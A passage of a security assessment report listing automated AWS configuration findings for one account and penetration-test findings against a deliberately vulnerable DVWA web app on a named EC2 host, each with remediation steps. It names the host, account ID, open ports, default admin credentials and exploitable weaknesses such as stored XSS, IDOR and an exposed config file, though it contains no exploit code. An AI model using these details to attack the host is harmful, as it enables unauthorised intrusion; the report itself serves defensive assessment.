**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:ap-northeast-2:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:ap-northeast-3:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:ap-south-1:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:ap-southeast-1:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:ap-southeast-2:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:ca-central-1:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:eu-central-1:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:eu-north-1:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:eu-west-1:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:eu-west-2:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:eu-west-3:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:sa-east-1:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:us-east-1:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:us-east-2:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:us-west-1:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:us-west-2:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

**Remediation:** Enable **IAM Access Analyzer** across all accounts and active Regions (*or organization-wide*). Operate on least privilege: continuously review findings, remove unintended access, and trim unused permissions. Use archive rules sparingly, integrate reviews into change/CI/CD workflows, and enforce separation of duties on policy changes.

### [LOW] IAM SAML provider exists in the account
- **Category:** iam_check_saml_providers_sts
- **Resource:** arn:aws:iam::760689105616:root

**IAM SAML providers** enable **federated role assumption** via STS `AssumeRoleWithSAML`.

This evaluates whether such providers exist in the account.

**Remediation:** Adopt **SAML federation** to issue **short-lived STS credentials**. Map users to roles with **least privilege**, enforce **MFA** at the IdP, and set conservative session durations. Retire IAM user access keys for interactive use and monitor role sessions as **defense in depth**. *If federation isn't possible*, tightly scope, rotate, and audit keys.

### [LOW] At least one IAM role has the AWSSupportAccess managed policy attached
- **Category:** iam_support_role_created
- **Resource:** arn:aws:iam::aws:policy/AWSSupportAccess

Presence of an **IAM role** that has the AWS managed `AWSSupportAccess` policy attached, designating a support role for interacting with **AWS Support Center** and related tooling.

**Remediation:** Create a dedicated IAM role for AWS Support with `AWSSupportAccess` and:
- Restrict who can assume it; require MFA and time-bound access
- Enforce **least privilege** and **separation of duties**
- Monitor usage via audit logs and review assignments regularly

### [LOW] No Rate Limiting on Guestbook / Stored XSS Endpoint
- **Category:** WSTG-BUSL-05
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_s/

The stored XSS guestbook endpoint at /vulnerabilities/xss_s/ has no rate limiting or submission throttling. Three consecutive POST requests were submitted without any blocking, CAPTCHA, or error response. This allows attackers to flood the guestbook with unlimited spam entries, stored XSS payloads, or use the endpoint for data exfiltration purposes without any restriction. Combined with the stored XSS vulnerability (FINDING-032), an attacker can automate mass injection of malicious scripts into the guestbook that will execute for every user who views the page.

**Remediation:** 1. Implement rate limiting on form submissions (e.g., max 5 submissions per IP per minute). 2. Add CAPTCHA to prevent automated submissions. 3. Implement a minimum time between submissions per session. 4. This is secondary to fixing the stored XSS vulnerability itself.

### [LOW] Reverse Tabnabbing - External Links Use target="_blank" Without rel="noopener"
- **Category:** WSTG-CLNT-14
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/index.php

Multiple pages in the application contain links with target="_blank" that do not include rel="noopener noreferrer". This allows the opened tab to access the opener's window object via window.opener, enabling reverse tabnabbing attacks. An attacker who can influence the content of a linked page could redirect the original tab to a phishing page after the user navigates to the external link. This was found on the about.php and upload vulnerability pages which link to OWASP resources and security tool sites.

**Remediation:** Add rel="noopener noreferrer" to all anchor tags that use target="_blank". Example: &lt;a href="https://external.com" target="_blank" rel="noopener noreferrer"&gt;. Modern browsers (Chrome 88+) implicitly set noopener for target="_blank" links, but explicit attribute is best practice for cross-browser support.

### [MEDIUM] phpinfo.php Publicly Accessible
- **Category:** WSTG-CONF-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/phpinfo.php

The PHP information page (phpinfo.php) is publicly accessible to authenticated users without restriction. This page reveals sensitive server configuration details including PHP version (7.0.30-0+deb9u1), installed extensions, environment variables, server paths, and system details (Linux Amazon Linux 2023 kernel). phpinfo.php is intended for debugging only and should never be accessible in production.

**Remediation:** Remove or restrict access to phpinfo.php. If required for debugging, restrict access by IP address via Apache configuration or remove the file entirely from production deployments.

### [MEDIUM] Verbose Server Error Messages Reveal Database Type and Version
- **Category:** WSTG-INFO-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/

The application returns verbose database error messages that expose the underlying database technology. When a SQL injection probe is submitted to the /vulnerabilities/sqli/ endpoint, the response reveals that the database is MariaDB and includes the exact SQL syntax error. Additionally, 404 error pages expose the Apache version and operating system. This information aids attackers in crafting targeted exploits.

**Remediation:** Configure PHP to suppress database error messages in production (display_errors = Off, log_errors = On). Implement custom error pages that do not reveal server internals. Use PDO exceptions and catch them to display generic error messages.

### [MEDIUM] Sensitive Configuration File Publicly Accessible (/config/config.inc.php)
- **Category:** WSTG-CONF-09
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php

The application configuration file /config/config.inc.php is publicly readable over HTTP without authentication. The file contains commented-out AWS credential templates (AKIA key ID and secret access key placeholders). While the current values are placeholders ("YOUR_KEY_ID_HERE"), the file structure confirms this path is intended for storing real AWS credentials, and the file is not protected by Apache access controls or authentication. If real credentials were inserted (or were previously present and cached), they would be fully exposed. The file is served with Content-Type text/html and returns HTTP 200 regardless of authentication status.

**Remediation:** 1. Immediately restrict access to /config/ directory via Apache .htaccess or main config: Deny from all / Require all denied. 2. Remove any real credentials from this file if they were ever present. 3. Move configuration files outside the webroot entirely (above the DocumentRoot). 4. Use environment variables or a secrets manager (AWS Secrets Manager, Parameter Store) for AWS credentials instead of flat files. 5. Audit git history to verify real credentials were never committed.

### [MEDIUM] DVWA Setup Page Exposes Default Credentials and Internal Paths
- **Category:** WSTG-CONF-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/setup.php

The DVWA setup page at /setup.php is accessible without restriction (HTTP 200) and discloses: (1) Default administrator credentials ("admin" // "password"), (2) The full filesystem path to the config file (/var/www/html/config/config.inc.php), (3) Whether the config directory is writable by the web server (Yes - www-data), (4) The database password (masked as ******). Additionally, Apache's server-status page (/server-status) returns HTTP 403 with the server version in the error page footer ("Apache/2.4.25 (Debian) Server at... Port 80"). The server version Apache/2.4.25 is significantly outdated (released 2017) and has known vulnerabilities. No /server-info page was found (404).

**Remediation:** 1. Restrict access to /setup.php via IP allowlist or authentication, or remove it from production. 2. Upgrade Apache from 2.4.25 to current stable version (2.4.62+) — version 2.4.25 has multiple known CVEs. 3. Configure Apache ServerTokens to 'Prod' to suppress version disclosure. 4. Ensure the config directory is not world-writable by the web server.

### [MEDIUM] Outdated Apache Web Server Version Disclosed (Apache/2.4.25 Debian)
- **Category:** WSTG-CONF-01
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/

The server discloses its exact version in the Server response header on every HTTP response: "Apache/2.4.25 (Debian)". Apache 2.4.25 was released in December 2016 and has numerous known CVEs. Open ports per nmap: TCP/22 (SSH - OpenSSH 8.7), TCP/80 (HTTP - Apache 2.4.25). Ports 443, 3306, 8080, 8443, 21 are filtered. The SSH service (OpenSSH 8.7) is also accessible, representing an additional attack surface if weak credentials are in use. No reverse proxy or CDN headers detected (no Via, CF-RAY, X-Cache, etc.).

**Remediation:** 1. Upgrade Apache to the current stable release (2.4.62+). 2. Set ServerTokens to 'Prod' in Apache config to suppress version info from headers. 3. Set ServerSignature to 'Off' to suppress version from error pages. 4. Apply all Debian security patches for the installed Apache version. 5. Consider restricting SSH access (port 22) to known IP ranges.

### [MEDIUM] Content Security Policy Missing or Critically Weak Across Application
- **Category:** WSTG-CONF-12
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/

No Content-Security-Policy header is present on any standard application page (/login.php, /index.php, /). The only CSP present is on /vulnerabilities/csp/ (an intentional DVWA challenge page), and that CSP is itself critically weak: it allows scripts from external domains including pastebin.com and the bare domain example.com (without HTTPS). The absence of CSP across the application means there is no browser-enforced mitigation against XSS attacks. Any reflected or stored XSS payload (which DVWA is intentionally vulnerable to) will execute without browser-level defense. This is especially significant given that FINDING-004 confirmed the session cookie lacks HttpOnly, making XSS-to-session-theft a complete attack chain.

**Remediation:** 1. Implement a Content-Security-Policy header on all application pages, starting with a restrictive default: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'. 2. Remove external domains from script-src unless strictly necessary. 3. Never allow pastebin.com or other user-content-hosting domains in script-src. 4. Use CSP nonces or hashes instead of 'unsafe-inline' for any inline scripts required. 5. Test CSP coverage using a CSP evaluator tool before deployment.

### [MEDIUM] Insecure Direct Object Reference — User Data Accessible by Arbitrary ID
- **Category:** WSTG-ATHZ-04
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/

The SQL Injection vulnerability module at /vulnerabilities/sqli/ exposes all application user records via an IDOR vulnerability. Any authenticated user can retrieve the first name and surname of any other user account by manipulating the "id" GET parameter. No authorization check verifies that the requesting user owns the requested record. All 5 user accounts (IDs 1-5) were enumerated successfully, including the admin account (ID=1). While this specific endpoint is the SQL Injection demonstration module in DVWA, the IDOR pattern demonstrates the absence of object-level authorization throughout the application.

Users exposed: admin/admin (ID 1), Gordon Brown (ID 2), Hack Me (ID 3), Pablo Picasso (ID 4), Bob Smith (ID 5).

**Remediation:** Implement object-level authorization checks: verify that the authenticated user has permission to access the requested record before returning data. For user-specific data, confirm that the session user ID matches the requested object ID (or the user has an admin role). Use parameterized queries and enforce row-level access controls at the database or application layer.

### [MEDIUM] No Account Lockout Mechanism on Login Form
- **Category:** WSTG-ATHN-03
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/login.php

The DVWA login form does not implement any account lockout, rate limiting, or brute-force protection. Ten consecutive failed login attempts for the admin account all returned the same generic "Login failed" response with HTTP 302 redirect to login.php. No CAPTCHA was presented, no lockout occurred, and no delay was introduced between attempts. This enables unlimited brute-force attacks against any account.

**Remediation:** Implement account lockout after 5 failed attempts (temporary lockout of 15-30 minutes). Add progressive delays between attempts. Consider implementing CAPTCHA after 3 failed attempts. Log and alert on repeated failed login attempts from same IP. Implement IP-based rate limiting.

### [MEDIUM] Apache Directory Listing Enabled on Multiple Sensitive Directories
- **Category:** WSTG-CONF-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/

Apache directory listing (Options +Indexes) is enabled on multiple directories: /config/ (contains configuration files including credential backup), /hackable/uploads/ (file upload destination — allows enumeration of uploaded files), and /docs/ (documentation). Directory listing allows attackers to enumerate all files in these directories without requiring knowledge of file names.

**Remediation:** Disable Apache directory listing globally by adding 'Options -Indexes' to the server or VirtualHost configuration. Apply to /config/, /hackable/uploads/, /docs/ and all other web-accessible directories.

### [MEDIUM] phpinfo.php Publicly Accessible - Full Server Configuration Exposure
- **Category:** WSTG-INFO-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/phpinfo.php

The phpinfo.php page is accessible to authenticated users and discloses extensive server configuration details including: PHP version (7.0.30-0+deb9u1, EOL since Dec 2018), system information (Linux, Amazon Linux 2023 kernel), document root (/var/www/html/), server name, disabled functions list, and other PHP configuration settings. PHP 7.0.x reached end-of-life in December 2018 and receives no security patches.

**Remediation:** 1. Remove or restrict access to phpinfo.php from production. 2. Upgrade PHP from EOL 7.0.x to a supported version (8.1+). 3. If phpinfo.php must exist, restrict access via .htaccess IP allowlist.

### [MEDIUM] Outdated Web Server and PHP Version Disclosed (Apache 2.4.25, PHP 7.0.30)
- **Category:** WSTG-INFO-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/

The Server response header discloses the exact web server version: Apache/2.4.25 (Debian). Apache 2.4.25 was released in December 2016 and has numerous known CVEs including CVE-2017-7679 (mod_mime buffer overread), CVE-2017-7668 (ap_find_token buffer overread), and CVE-2017-9788 (mod_auth_digest memory issues). The 404 error page also displays the server version and hostname. PHP 7.0.30 (exposed via phpinfo.php) reached end-of-life in December 2018 and receives no security updates.

**Remediation:** 1. Update Apache to a supported version (2.4.62+). 2. Upgrade PHP to a supported version (8.1+). 3. Suppress exact version in Server header via ServerTokens Prod in Apache config. 4. Customize error pages to remove server version disclosure.

### [MEDIUM] CloudWatch log metric filter and alarm exist for Network ACL (NACL) change events
- **Category:** cloudwatch_changes_to_network_acls_alarm_configured
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

CloudTrail records for **Network ACL changes** are matched by a CloudWatch Logs metric filter with an associated alarm for events like `CreateNetworkAcl`, `CreateNetworkAclEntry`, `DeleteNetworkAcl`, `DeleteNetworkAclEntry`, `ReplaceNetworkAclEntry`, and `ReplaceNetworkAclAssociation`.

**Remediation:** Implement a CloudWatch Logs metric filter and alarm for NACL change events from CloudTrail and route alerts to responders. Enforce **least privilege** on NACL management, require **change control**, and use **defense in depth** with configuration monitoring and flow logs to validate and monitor network posture.

### [MEDIUM] CloudWatch Logs metric filter and alarm exist for changes to network gateways
- **Category:** cloudwatch_changes_to_network_gateways_alarm_configured
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

CloudWatch log metric filters and alarms for **network gateway changes** are identified by matching CloudTrail events such as `CreateCustomerGateway`, `DeleteCustomerGateway`, `AttachInternetGateway`, `CreateInternetGateway`, `DeleteInternetGateway`, and `DetachInternetGateway` in log groups that receive trail logs.

**Remediation:** Send CloudTrail to CloudWatch Logs and create a metric filter for the listed gateway events with an alarm that notifies responders. Enforce **least privilege** for gateway modifications, require change approvals, and route alerts to monitored channels as part of **defense in depth**.

### [MEDIUM] Account monitors VPC route table changes with a CloudWatch Logs metric filter and alarm
- **Category:** cloudwatch_changes_to_network_route_tables_alarm_configured
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

**VPC route table changes** are captured from **CloudTrail logs** by a **CloudWatch Logs metric filter** with an associated **alarm** for events like `CreateRoute`, `CreateRouteTable`, `ReplaceRoute`, `ReplaceRouteTableAssociation`, `DeleteRoute`, `DeleteRouteTable`, and `DisassociateRouteTable`.

**Remediation:** Implement a **CloudWatch Logs metric filter and alarm** on CloudTrail for these route table events and notify responders. Enforce **least privilege** for route modifications, require **change control**, and apply **defense in depth** with VPC Flow Logs and guardrails to prevent and quickly contain unsafe routing changes.

### [MEDIUM] AWS account has a CloudWatch Logs metric filter and alarm for VPC changes
- **Category:** cloudwatch_changes_to_vpcs_alarm_configured
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

**CloudTrail events** for **VPC configuration changes** are captured in CloudWatch Logs with a metric filter and an associated alarm. The filter targets actions like `CreateVpc`, `DeleteVpc`, `ModifyVpcAttribute`, and VPC peering operations to surface when network topology is altered.

**Remediation:** Create a CloudWatch Logs metric filter and alarm on CloudTrail for critical **VPC change events**, and notify responders. Apply **least privilege** to network changes, require change approvals, and use **defense in depth** (segmentation, route controls) to prevent and contain unauthorized modifications.

### [MEDIUM] CloudWatch Logs metric filter and alarm exist for AWS Config configuration changes
- **Category:** cloudwatch_log_metric_filter_and_alarm_for_aws_config_configuration_changes_enabled
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

CloudTrail logs in **CloudWatch Logs** are inspected for a metric filter and alarm that track **AWS Config configuration changes**, specifically `StopConfigurationRecorder`, `DeleteDeliveryChannel`, `PutDeliveryChannel`, and `PutConfigurationRecorder` events from `config.amazonaws.com`.

**Remediation:** Create a **CloudWatch Logs metric filter and alarm** for `config.amazonaws.com` events (`StopConfigurationRecorder`, `DeleteDeliveryChannel`, `PutDeliveryChannel`, `PutConfigurationRecorder`). Route CloudTrail to Logs, notify responders, and enforce **least privilege** and **separation of duties** on Config changes to prevent abuse.

### [MEDIUM] CloudWatch Logs metric filter and alarm exist for CloudTrail configuration changes
- **Category:** cloudwatch_log_metric_filter_and_alarm_for_cloudtrail_configuration_changes_enabled
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

**CloudTrail logs** include a **metric filter** for trail configuration events (`CreateTrail`, `UpdateTrail`, `DeleteTrail`, `StartLogging`, `StopLogging`) with an associated **CloudWatch alarm** to alert on matches.

Evaluates the presence of this filter-and-alarm monitoring.

**Remediation:** Implement a **metric filter** for trail configuration events and a linked **alarm** that notifies response channels.

Apply **least privilege** and **separation of duties** for trail changes, add **defense in depth** with centralized logging and validation, and regularly test that alerts fire.

### [MEDIUM] Account has a CloudWatch Logs metric filter and alarm for AWS Management Console authentication failures
- **Category:** cloudwatch_log_metric_filter_authentication_failures
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

CloudWatch Logs metric filter and alarm for **AWS Management Console authentication failures**, sourced from CloudTrail (`eventName=ConsoleLogin`, `errorMessage="Failed authentication"`).

Identifies whether these failures are converted into a metric and actively monitored by an alarm.

**Remediation:** Implement a log metric filter for `ConsoleLogin` failures and attach a **CloudWatch alarm** with actionable notifications. Tune thresholds to reduce noise and route alerts to incident response.

Apply **least privilege** and enforce **MFA** to limit impact, and correlate alerts with source IP and user context.

### [MEDIUM] CloudWatch Logs metric filter and alarm exist for AWS Organizations changes
- **Category:** cloudwatch_log_metric_filter_aws_organizations_changes
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

**CloudWatch Logs** metric filters and alarms monitor **AWS Organizations** change events recorded by CloudTrail, including actions like `CreateAccount`, `AttachPolicy`, `MoveAccount`, and `UpdateOrganizationalUnit`.

The evaluation looks for a filter on the trail log group matching `organizations.amazonaws.com` events and an alarm linked to that metric.

**Remediation:** Send CloudTrail events to **CloudWatch Logs**, add a metric filter for `organizations.amazonaws.com` change events, and attach an alarm that notifies responders. Enforce **least privilege** and **separation of duties** for org admins, require MFA and approvals, and regularly test alerts to ensure timely detection and response.

### [MEDIUM] Account has a CloudWatch log metric filter and alarm for disabling or scheduled deletion of customer-managed KMS keys
- **Category:** cloudwatch_log_metric_filter_disable_or_scheduled_deletion_of_kms_cmk
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

CloudTrail events delivered to CloudWatch are evaluated for a **metric filter and alarm** that monitor **KMS CMK state changes**, specifically `DisableKey` and `ScheduleKeyDeletion` from `kms.amazonaws.com`.

**Remediation:** Establish **CloudWatch metric filters and alarms** for `DisableKey` and `ScheduleKeyDeletion` CloudTrail events to enable rapid response.
- Apply **least privilege** to KMS administration
- Enforce **change control** and separation of duties
- Use deletion waiting periods and monitor all regions

### [MEDIUM] CloudWatch log metric filter and alarm exist for S3 bucket policy changes
- **Category:** cloudwatch_log_metric_filter_for_s3_bucket_policy_changes
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

**CloudTrail** logs are assessed for a **CloudWatch metric filter** matching S3 bucket configuration changes (ACL, policy, CORS, lifecycle, replication; e.g., `PutBucketPolicy`, `DeleteBucketPolicy`) and for an associated **CloudWatch alarm**.

**Remediation:** Establish and maintain **metric filters** and **alarms** for S3 bucket policy, ACL, CORS, lifecycle, and replication changes. Route alerts to monitored channels and integrate with SIEM. Enforce **least privilege**, require change reviews, and use **defense in depth** to prevent and quickly detect unsafe bucket policy changes.

### [MEDIUM] CloudWatch Logs metric filter and alarm exist for IAM policy changes
- **Category:** cloudwatch_log_metric_filter_policy_changes
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

CloudWatch uses a metric filter and alarm to track **IAM policy changes** recorded by CloudTrail (e.g., `CreatePolicy`, `DeletePolicy`, version changes, inline policy edits, policy attach/detach). This finding reflects whether that filter and an associated alarm are present on the trail's log group.

**Remediation:** Create a metric filter for IAM policy create/update/delete and attach/detach events with an **alarm** to notify responders.
- Enforce **least privilege** and separation of duties for policy changes
- Require approvals and central logging across Regions/accounts
- Integrate alerts with incident response

### [MEDIUM] Account has a CloudWatch Logs metric filter and alarm for root account usage
- **Category:** cloudwatch_log_metric_filter_root_usage
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

**CloudTrail** logs in CloudWatch include a metric filter for **root account activity** (`{ $.userIdentity.type = "Root" && $.userIdentity.invokedBy NOT EXISTS && $.eventType != "AwsServiceEvent" }`) and a linked CloudWatch alarm that triggers when the filter matches.

**Remediation:** Enable real-time alerts for **root activity** using a log metric filter and a high-priority alarm with notifications.

Reduce exposure: enforce **least privilege**, keep root for *break-glass* with MFA, disable root access keys, and route alerts into incident response for **defense in depth**.

### [MEDIUM] CloudWatch Logs metric filter and alarm exist for security group changes
- **Category:** cloudwatch_log_metric_filter_security_group_changes
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

**CloudTrail** events for **security group configuration changes** are monitored using a **CloudWatch Logs metric filter** with an associated **alarm**. The filter targets actions like `AuthorizeSecurityGroupIngress/Egress`, `RevokeSecurityGroupIngress/Egress`, `CreateSecurityGroup`, and `DeleteSecurityGroup` to surface any security group modifications.

**Remediation:** Establish real-time alerts for **security group modifications** by sending CloudTrail to CloudWatch, creating metric filters and alarms, and notifying responders.
- Enforce **least privilege** on SG changes
- Use change management and tagging
- Centralize logs, test alarms, and maintain runbooks
- Layer with NACLs and WAF for **defense in depth**

### [MEDIUM] CloudWatch log metric filter and alarm exist for Management Console sign-in without MFA
- **Category:** cloudwatch_log_metric_filter_sign_in_without_mfa
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

**CloudTrail logs** in CloudWatch are assessed for a metric filter and alarm that detect console logins where `$.eventName = ConsoleLogin` and `$.additionalEventData.MFAUsed != \"Yes\"`.

This reflects whether alerting exists for sign-ins that occur without **MFA**.

**Remediation:** Enforce **MFA** for all console-capable identities and maintain alerts for `ConsoleLogin` with `MFAUsed != \"Yes\"`.

Apply **least privilege**, route alarms to monitored channels, and tune for SSO to reduce noise. Test alarms regularly and review coverage as part of **defense in depth**.

### [MEDIUM] CloudWatch Logs metric filter and alarm exist for unauthorized API calls
